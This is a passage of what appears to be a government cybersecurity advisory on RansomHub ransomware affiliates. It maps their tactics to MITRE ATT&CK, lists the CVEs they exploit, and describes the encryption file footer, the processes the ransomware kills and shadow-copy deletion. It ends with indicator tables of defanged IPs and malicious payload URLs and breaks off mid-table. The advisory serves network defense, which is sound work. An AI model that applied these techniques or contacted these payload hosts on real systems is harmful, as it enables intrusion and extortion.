<h2><strong>Technical Details</strong></h2>
<p><strong>Note:</strong> This advisory uses the <a href="https://attack.mitre.org/versions/v15/matrices/enterprise/" title="Enterprise Matrix">MITRE ATT&amp;CK<sup>®</sup> Matrix for Enterprise</a> framework, version 15. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>
<h3>Initial Access</h3>
<p>RansomHub affiliates typically compromise internet facing systems and user endpoints by using methods such as phishing emails [<a href="https://attack.mitre.org/versions/v15/techniques/T1566/" title="Phishing">T1566</a>], exploitation of known vulnerabilities [<a href="https://attack.mitre.org/versions/v15/techniques/T1190/" title="Exploit Public-Facing Application">T1190</a>], and password spraying [<a href="https://attack.mitre.org/versions/v15/techniques/T1110/003/" title="Brute Force: Password Spraying">T1110.003</a>]. Password spraying targets accounts compromised through data breaches. Proof-of-concept exploits are obtained from sources such as ExploitDB and GitHub [<a href="https://attack.mitre.org/versions/v15/techniques/T1588/005/" title="Obtain Capabilities: Exploits">T1588.005</a>]. Exploits based on the following CVEs have been observed:</p>
<ul>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2023-3519" title="CVE-2023-3519">CVE-2023-3519</a> (<a href="https://www.cvedetails.com/cwe-details/94/Improper-Control-of-Generation-of-Code-Code-Injection-.html" title="CWE-94 : Improper Control of Generation of Code ('Code Injection')">CWE-94</a>)
<ul>
<li>Citrix ADC (NetScaler) Remote Code Execution. A vulnerability exists within Citrix ADC that allows an unauthenticated attacker to trigger a stack buffer overflow of the NSPPE (NetScaler Packet Processing Engine) process by making a specially crafted HTTP GET request. Successful exploitation results in remote code execution as root.</li>
</ul>
</li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2023-27997" title="CVE-2023-27997">CVE-2023-27997</a> (<a href="https://www.cvedetails.com/cwe-details/787/Out-of-bounds-Write.html" title="CWE-787 : Out-of-bounds Write">CWE-787</a> | <a href="https://www.cvedetails.com/cwe-details/122/Heap-based-Buffer-Overflow.html" title="CWE-122 : Heap-based Buffer Overflow">CWE-122</a>)
<ul>
<li>A heap-based buffer overflow vulnerability in FortiOS version 7.2.4 and below, version 7.0.11 and below, version 6.4.12 and below, version 6.0.16 and below and FortiProxy version 7.2.3 and below, version 7.0.9 and below, version 2.0.12 and below, version 1.2 all versions, version 1.1 all versions SSL-VPN may allow a remote attacker to execute arbitrary code or commands via specifically crafted requests.</li>
</ul>
</li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2023-46604" title="CVE-2023-46604">CVE-2023-46604</a> (<a href="https://www.cvedetails.com/cwe-details/502/Deserialization-of-Untrusted-Data.html" title="CWE-502 : Deserialization of Untrusted Data">CWE-502</a>)
<ul>
<li>The Java OpenWire protocol marshaller, such as in Apache ActiveMQ, is vulnerable to Remote Code Execution. This vulnerability may allow a remote attacker with network access to open either a Java-based OpenWire broker or client to run arbitrary shell commands by manipulating serialized class types in the OpenWire protocol to cause either the client or the broker (respectively) to instantiate any class on the classpath. Upgrading both brokers and clients to version 5.15.16, 5.16.7, 5.17.6, or 5.18.3 fixes this issue.</li>
</ul>
</li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2023-22515" title="CVE-2023-22515">CVE-2023-22515</a>
<ul>
<li>A vulnerability in publicly accessible Confluence Data Center and Server instances that allows the creation of unauthorized Confluence administrator accounts and access to Confluence instances. Atlassian Cloud sites are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, it is hosted by Atlassian and is not vulnerable to this issue.</li>
</ul>
</li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2023-46747" title="CVE-2023-46747">CVE-2023-46747</a> (<a href="https://www.cvedetails.com/cwe-details/306/Missing-Authentication-for-Critical-Function.html" title="CWE-306 : Missing Authentication for Critical Function">CWE-306</a> | <a href="https://www.cvedetails.com/cwe-details/288/Authentication-Bypass-Using-an-Alternate-Path-or-Channel.html" title="CWE-288 : Authentication Bypass Using an Alternate Path or Channel">CWE-288</a>)
<ul>
<li>Undisclosed requests may bypass configuration utility authentication, allowing an attacker with network access to the BIG-IP system through the management port and/or self IP addresses to execute arbitrary system commands. <strong>Note:</strong> Software versions which have reached End of Technical Support (EoTS) are not evaluated.</li>
</ul>
</li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2023-48788" title="CVE-2023-48788">CVE-2023-48788</a> (<a href="https://www.cvedetails.com/cwe-details/89/Improper-Neutralization-of-Special-Elements-used-in-an-SQL-C.html" title="CWE-89 : Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')">CWE-89</a>)
<ul>
<li>An improper neutralization of special elements used in an SQL command (SQL injection') in Fortinet FortiClientEMS version 7.2.0 through 7.2.2 and FortiClientEMS 7.0.1 through 7.0.10 allows attacker to execute unauthorized code or commands via specially crafted packets.</li>
</ul>
</li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2017-0144" title="CVE-2017-0144">CVE-2017-0144</a>
<ul>
<li>The SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets, also known as “Windows SMB Remote Code Execution Vulnerability” [<a href="https://attack.mitre.org/versions/v15/techniques/T1210/">T1210</a>].</li>
</ul>
</li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2020-1472" title="CVE-2020-1472">CVE-2020-1472</a>
<ul>
<li>An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller using the Netlogon Remote Protocol (MS-NRPC).</li>
</ul>
</li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2020-0787" title="CVE-2020-0787">CVE-2020-0787</a>
<ul>
<li>This vulnerability was also potentially exploited along with the Zerologon privilege escalation vulnerability.</li>
</ul>
</li>
</ul>
<h3>Discovery</h3>
<p>RansomHub affiliates conduct network scanning with tools such as AngryIPScanner, Nmap, and PowerShell-based living off the land methods with PowerShell to conduct network scanning [<a href="https://attack.mitre.org/versions/v15/techniques/T1018/" title="Remote System Discovery">T1018</a>][<a href="https://attack.mitre.org/versions/v15/techniques/T1046/" title="Network Service Discovery">T1046</a>][<a href="https://attack.mitre.org/versions/v15/techniques/T1059/001/" title="Command and Scripting Interpreter: PowerShell">T1059.001</a>].</p>
<h3>Defense Evasion</h3>
<p>Cybersecurity researchers have observed affiliates renaming the ransomware executable with innocuous file names, such as <code>Windows.exe</code>, left on the user’s desktop (<code>C:\Users\%USERNAME%\Desktop</code>) or downloads (<code>C:\Users\%USERNAME%\Downloads</code>) [<a href="https://attack.mitre.org/versions/v15/techniques/T1036/" title="Masquerading">T1036</a>]. The affiliates have also cleared Windows and Linux system logs to inhibit any potential incident response [<a href="https://attack.mitre.org/versions/v15/techniques/T1070/" title="Indicator Removal">T1070</a>]. Affiliates used Windows Management Instrumentation [<a href="https://attack.mitre.org/versions/v15/techniques/T1047/" title="Windows Management Instrumentation">T1047</a>] to disable antivirus products. In some instances, RansomHub-specific tools were deployed to disable endpoint detection and response (EDR) tooling [<a href="https://attack.mitre.org/versions/v15/techniques/T1562/001/" title="Impair Defenses: Disable or Modify Tools">T1562.001</a>].</p>
<h3>Privilege Escalation and Lateral Movement</h3>
<p>Following initial access, RansomHub affiliates created user accounts for persistence [<a href="https://attack.mitre.org/versions/v15/techniques/T1136/" title="Create Account">T1136</a>], reenabled disabled accounts [<a href="https://attack.mitre.org/versions/v15/techniques/T1098/" title="Account Manipulation">T1098</a>], and used Mimikatz [<a href="https://attack.mitre.org/versions/v15/software/S0002/" title="Mimikatz">S0002</a>] on Windows systems to gather credentials [<a href="https://attack.mitre.org/versions/v15/techniques/T1003/" title="OS Credential Dumping">T1003</a>] and escalate privileges to SYSTEM [<a href="https://attack.mitre.org/versions/v15/techniques/T1068/" title="Exploitation for Privilege Escalation">T1068</a>]. Affiliates then moved laterally inside the network through methods including Remote Desktop Protocol (RDP) [<a href="https://attack.mitre.org/versions/v15/techniques/T1021/001/" title="Remote Services: Remote Desktop Protocol">T1021.001</a>], PsExec [<a href="https://attack.mitre.org/versions/v15/software/S0029/" title="PsExec">S0029</a>], Anydesk [<a href="https://attack.mitre.org/versions/v15/techniques/T1219/" title="Remote Access Software">T1219</a>], Connectwise, N-Able, Cobalt Strike [<a href="https://attack.mitre.org/versions/v15/software/S0154/" title="Cobalt Strike">S0154</a>], Metasploit, or other widely used command-and-control (C2) methods.</p>
<h3>Data Exfiltration</h3>
<p>Data exfiltration methods depend heavily on the affiliate conducting the network compromise. The ransomware binary does not normally include any mechanism for data exfiltration. Data exfiltration has been observed through the usage of tools such as PuTTY [<a href="https://attack.mitre.org/versions/v15/techniques/T1048/002/" title="Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol">T1048.002</a>], Amazon AWS S3 buckets/tools [<a href="https://attack.mitre.org/versions/v15/techniques/T1537/" title="Transfer Data to Cloud Account">T1537</a>], HTTP POST requests [<a href="https://attack.mitre.org/versions/v15/techniques/T1048/003/" title="Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol">T1048.003</a>], WinSCP, Rclone, Cobalt Strike, Metasploit, and other methods.</p>
<h3>Encryption</h3>
<p>RansomHub ransomware has typically leveraged an Elliptic Curve Encryption algorithm called Curve 25519 to encrypt user accessible files on the system [<a href="https://attack.mitre.org/versions/v15/techniques/T1486/" title="Data Encrypted for Impact">T1486</a>]. Curve 25519 uses a public/private key that is unique to each victim organization. To successfully encrypt files that are currently in use, the ransomware binary will typically attempt to stop the following processes:</p>
<ul>
<li><em>"vmms.exe"</em></li>
<li><em>"msaccess.exe"</em></li>
<li><em>"mspub.exe"</em></li>
<li><em>"svchost.exe"</em></li>
<li><em>"vmcompute.exe"</em></li>
<li><em>"notepad.exe"</em></li>
<li><em>"ocautoupds.exe"</em></li>
<li><em>"ocomm.exe"</em></li>
<li><em>"ocssd.exe"</em></li>
<li><em>"oracle.exe"</em></li>
<li><em>"onenote.exe"</em></li>
<li><em>"outlook.exe"</em></li>
<li><em>"powerpnt.exe"</em></li>
<li><em>"explorer.exe"</em></li>
<li><em>"sql.exe"</em></li>
<li><em>"steam.exe"</em></li>
<li><em>"synctime.exe"</em></li>
<li><em>"vmwp.exe"</em></li>
<li><em>"thebat.exe"</em></li>
<li><em>"thunderbird.exe"</em></li>
<li><em>"visio.exe"</em></li>
<li><em>"winword.exe"</em></li>
<li><em>"wordpad.exe"</em></li>
<li><em>"xfssvccon.exe"</em></li>
<li><em>"TeamViewer.exe"</em></li>
<li><em>"agntsvc.exe"</em></li>
<li><em>"dbsnmp.exe"</em></li>
<li><em>"dbeng50.exe"</em></li>
<li><em>"encsvc.exe"</em></li>
</ul>
<p>The ransomware binary will attempt to encrypt any files that the user has access to, including user files and networked shares.</p>
<p>RansomHub implements intermittent encryption, encrypting files in 0x100000 byte chunks and skipping every 0x200000 bytes of data in between encrypted chunks. Files smaller than 0x100000 bytes in size are completely encrypted. Files are appended with 58 (0x3A) bytes of data at the end. This data contains a value which is likely part of an encryption/decryption key. The structure of the appended 0x3A bytes is listed below with images from three different encrypted files.</p>



<figure class="c-figure c-figure--image">
  
  <div class="c-figure__media">    <img alt="Figure 1 - The first eight bytes" height="116" src="https://www.cisa.gov/sites/default/files/styles/large/public/2024-08/Figure%201%20-%20The%20first%20eight%20bytes.png?itok=7KCmOV_-" width="496" />



</div>
      <figcaption class="c-figure__caption"><em>Figure 1: The first eight bytes are the size of the encrypted file.</em></figcaption>
  </figure>
<p>The next eight bytes are the size of encrypted blocks. If the entire file is encrypted, this section is all zeros. In this example, each encrypted section is 0x100000 bytes long, with 0x100000 bytes between each encrypted block. This number was observed changing based on the size of the encrypted file.</p>



<figure class="c-figure c-figure--image">
  
  <div class="c-figure__media">    <img alt="Figure 2 - The size of encrypted blocks" height="85" src="https://www.cisa.gov/sites/default/files/styles/large/public/2024-08/Figure%202%20-%20The%20size%20of%20encrypted%20blocks.png?itok=59AF45Sy" width="496" />



</div>
      <figcaption class="c-figure__caption"><em>Figure 2: The size of encrypted blocks.</em></figcaption>
  </figure>
<p>The next two bytes were always seen to be 0x0001.</p>



<figure class="c-figure c-figure--image">
  
  <div class="c-figure__media">    <img alt="Figure 3 - The next two bytes" height="100" src="https://www.cisa.gov/sites/default/files/styles/large/public/2024-08/Figure%203%20-%20The%20next%20two%20bytes.png?itok=M7DpLyKf" width="494" />



</div>
      <figcaption class="c-figure__caption"><em>Figure 3: The next two bytes are always 0x0001.</em></figcaption>
  </figure>
<p>The next 32 bytes are the public encryption key for the file.</p>



<figure class="c-figure c-figure--image">
  
  <div class="c-figure__media">    <img alt="Figure 4 - Public encryption key" height="94" src="https://www.cisa.gov/sites/default/files/styles/large/public/2024-08/Figure%204%20-%20Public%20encryption%20key.png?itok=V09lNet1" width="493" />



</div>
      <figcaption class="c-figure__caption"><em>Figure 4: Public encryption key for the file.</em></figcaption>
  </figure>
<p>The next four bytes are a checksum value.</p>



<figure class="c-figure c-figure--image">
  
  <div class="c-figure__media">    <img alt="Figure 5 - Checksum value" height="83" src="https://www.cisa.gov/sites/default/files/styles/large/public/2024-08/Figure%205%20-%20Checksum%20value.png?itok=27hZrM7n" width="498" />



</div>
      <figcaption class="c-figure__caption"><em>Figure 5: Checksum value.</em></figcaption>
  </figure>
<p>The last four bytes are always seen to be the sequence 0x00ABCDEF.</p>



<figure class="c-figure c-figure--image">
  
  <div class="c-figure__media">    <img alt="Figure 6 - The last four bytes" height="82" src="https://www.cisa.gov/sites/default/files/styles/large/public/2024-08/Figure%206%20-%20The%20last%20four%20bytes.png?itok=cT5kmoKF" width="495" />



</div>
      <figcaption class="c-figure__caption"><em>Figure 6: The last four bytes.</em></figcaption>
  </figure>
<p>The ransomware executable does not typically encrypt executable files.&nbsp;A random file extension is added to file names and a ransom note generally titled <code>How To Restore Your Files.txt</code> is left on the compromised system. To further inhibit system recovery, the ransomware executable typically leverages the <code>vssadmin.exe</code> program to delete volume shadow copies [<a href="https://attack.mitre.org/versions/v15/techniques/T1490/" title="Inhibit System Recovery">T1490</a>].</p>
<h3>Leveraged Tools</h3>
<p>See <strong>Table 1</strong> for publicly available tools and applications used by RansomHub affiliates. This includes legitimate tools repurposed for their operations.</p>
<p><strong>Disclaimer:</strong> Use of these tools and applications should not be attributed as malicious without analytical evidence to support threat actor use and/or control.</p>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 1: Tools Used by RansomHub Affiliates</em></caption>
<thead>
<tr>
<th><strong>Tool Name</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>BITSAdmin</td>
<td>A command-line utility that manages downloads/uploads between a client and server by using the Background Intelligent Transfer Service (BITS) to perform asynchronous file transfers.</td>
</tr>
<tr>
<td>Cobalt Strike [<a href="https://attack.mitre.org/versions/v15/software/S0154/" title="Cobalt Strike">S0154</a>]</td>
<td>A penetration testing tool used by security professionals to test the security of networks and systems. RansomHub affiliates have used it to assist with lateral movement and file execution.</td>
</tr>
<tr>
<td>Mimikatz [<a href="https://attack.mitre.org/versions/v15/software/S0002/" title="Mimikatz">S0002</a>]</td>
<td>A tool that allows users to view and save authentication credentials such as Kerberos tickets. RansomHub affiliates have used it to aid privilege escalation.</td>
</tr>
<tr>
<td>PSExec [<a href="https://attack.mitre.org/versions/v15/software/S0029/" title="PSExec">S0029</a>]</td>
<td>A tool designed to run programs and execute commands on remote systems.</td>
</tr>
<tr>
<td>PowerShell</td>
<td>Cross-platform task automation solution made up of a command line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.</td>
</tr>
<tr>
<td>RClone</td>
<td>A command line program used to sync files with cloud storage services.</td>
</tr>
<tr>
<td>Sliver</td>
<td>A penetration testing toolset which allows for remote command and control of systems.</td>
</tr>
<tr>
<td>SMBExec</td>
<td>A tool designed to manipulate SMB services for remote code execution.</td>
</tr>
<tr>
<td>WinSCP</td>
<td>Windows Secure Copy is a free and open source SSH File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Affiliates have used it to transfer data from a compromised network to actor-controlled accounts.</td>
</tr>
<tr>
<td>CrackMapExec</td>
<td>Pentest Toolset</td>
</tr>
<tr>
<td>Kerberoast</td>
<td>Kerberos Brute force and Exploitation Tool</td>
</tr>
<tr>
<td>AngryIPScanner</td>
<td>Network Scanner</td>
</tr>
</tbody>
</table>
<h2><strong>Indicators of Compromise</strong></h2>
<p><strong>Disclaimer:</strong> Several of these IP addresses were first observed as early as 2020, although most date from 2022 or 2023 and have been historically linked to QakBot. The authoring organizations recommend organizations investigate or vet these IP addresses prior to taking action (such as blocking).</p>
<p>See <strong>Table 2–Table 5</strong> for IOCs obtained from FBI investigations.</p>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 2: Directory Structure TTPs</em></caption>
<thead>
<tr>
<th>Filename</th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python311\Scripts\crackmapexec.exe</td>
<td>CrackMapExec</td>
</tr>
<tr>
<td>C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python311\Scripts\kerbrute.exe</td>
<td>Kerberoasting</td>
</tr>
<tr>
<td>C:\Users\%USERNAME%\Downloads\Anydesk.exe</td>
<td>Anydesk C2</td>
</tr>
<tr>
<td>C:\Users\%USERNAME%\Desktop\IamBatMan.exe</td>
<td>Ransomware</td>
</tr>
<tr>
<td>C:\Users\backupexec\Desktop\stealer_cli_v2.exe</td>
<td>Info Stealer</td>
</tr>
<tr>
<td>C:\Users\%USERNAME%\Downloads\nmap-7.94-setup.exe</td>
<td>Nmap</td>
</tr>
<tr>
<td>C:\Program Files (x86)\Nmap\nmap.exe</td>
<td>Nmap</td>
</tr>
<tr>
<td>C:\Users\%USERNAME%\Downloads\mimikatz_trunk\x64\mimikatz.exe</td>
<td><a>Mimikatz</a></td>
</tr>
<tr>
<td>C:\Users\backupexec\Downloads\x64\mimikatz.exe</td>
<td>Mimikatz</td>
</tr>
</tbody>
</table>
<p><strong>Disclaimer</strong>: The authoring organizations recommend network defenders investigate or vet IP addresses prior to taking action, such as blocking. Many cyber actors are known to change IP addresses, sometimes daily, and some IP addresses may host valid domains.</p>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 3: Known IPs Related to Malicious Activity (2023-2024)</em></caption>
<thead>
<tr>
<th>IP Address</th>
</tr>
</thead>
<tbody>
<tr>
<td><a>8.211.2[.]97</a></td>
</tr>
<tr>
<td>45.95.67[.]41</td>
</tr>
<tr>
<td>45.134.140[.]69</td>
</tr>
<tr>
<td>45.135.232[.]2</td>
</tr>
<tr>
<td>89.23.96[.]203</td>
</tr>
<tr>
<td>188.34.188[.]7</td>
</tr>
<tr>
<td>193.106.175[.]107</td>
</tr>
<tr>
<td>193.124.125[.]78</td>
</tr>
<tr>
<td>193.233.254[.]21</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 4: Known URLs Related to Malicious Activity (2023-2024)</em></caption>
<thead>
<tr>
<th>Web Requests</th>
</tr>
</thead>
<tbody>
<tr>
<td><a>http[:]//188.34.188[.]7/555</a></td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/amba16.ico</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/bcrypt.dll</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/CRYPTSP.dll</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/en</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/en-US</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/NEWOFFICIALPROGRAMCAUSEOFNEWUPDATE.exe</td>
</tr>
<tr>
<td>http[:]//188.34.188[.]7/555/NEWOFFICIALPROGRAMCAUSEOFNEWUPDATE.exe.Config</td>
</tr>
<tr>
<td>http[:]//188.34.188[].7/555/NEWOFFICIALPROGRAMCAUSEOFNEWUPDATE.INI</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/1.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/1.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/10.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/12.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/12.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2wrRR6sW6XJtsXyPzuhWhDG7qwN4es.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2wrRR6sW6XJtsXyPzuhWhDG7qwN4es.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/3.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/3.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/4.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/4.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/5.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/5.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/6.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/7.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/8.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/9.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/92.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/AmbaPDF.ico</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/ambapdf.ico.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/bcrypt.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/Cabinet.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/CRYPTBASE.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/cryptnet.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/CRYPTSP.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/cv4TCGxUjvS.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/DPAPI.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/en-US/d%E5%AD%97%E5%AD%97.resources/d%E5%AD%97%E5%AD%97.resources.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/iertutil.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/information.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/information.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/information.INI</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/IPHLPAPI.DLL</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/mshtml.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/msi.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/SspiCli.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/TmsLA6kdcU8jxKzpMvbUVweTeF5YcR.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/TmsLA6kdcU8jxKzpMvbUVweTeF5YcR.exe.Config</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/2wrRR6sW6XJtsXyPzuhWhDG7qwN4es.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/xwenxub285p83ecrzvft.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/cv4TCGxUjvS.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/urlmon.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/USERENV.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/webio.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/winhttp.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/WININET.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/WINMM.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/WINMMBASE.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/winnlsres.dll</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/xwenxub285p83ecrzvft.exe</td>
</tr>
<tr>
<td>http[:]//89.23.96[.]203/333/xwenxub285p83ecrzvft.exe.Config</td>
</tr>
<tr>
<td>http[:]//temp.sh/KnCqD/superloop.exe</td>
</tr>
<tr>
<td>https[:]//grabify.link/Y33YXP</td>
</tr>
<tr>
<td>https[:]//<a>i.ibb.co</a>/2KBydfw/112882618.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/4g6jH2J/2773036704.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/b1bZBpg/2615174623.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/Fxhyq6t/2077411869.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/HK0jV1G/534475006.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/nbMNnW4/2501108160.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/p1RCtpy/2681232755.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/SxQLwYm/1038436121.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/v1bn9ZK/369210627.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/V3Kj1c2/1154761258.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.co/X2FR8Kz/2113791011.png</td>
</tr>
<tr>
<td>https[:]//i.ibb.com:443/V3Kj1c2/1154761258.png</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.tripadvisor/module.tripadvisor.css</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.external/moment.min.js</td>
</tr>
<tr>
<td>https[:]//12301230[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//<a>12301230[.]co</a>/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/moment.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/npm/</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external</td>
</tr>
<tr>
<td><a>https[:]//samuelelena[.]co</a>/np</td>
</tr>
<tr>
<td>https[:]/samuelelena[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module[.]tripadvisor/module[.]tripadvisor[.]js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module[.]external/client.min.js</td>
</tr>
<tr>
<td>https[:]//samuelelena[.]co/npm/module.external/jquery.min.js&amp;nbsp;</td>
</tr>
<tr>
<td>http[:]//samuelelena[.]co:443/</td>
</tr>
<tr>
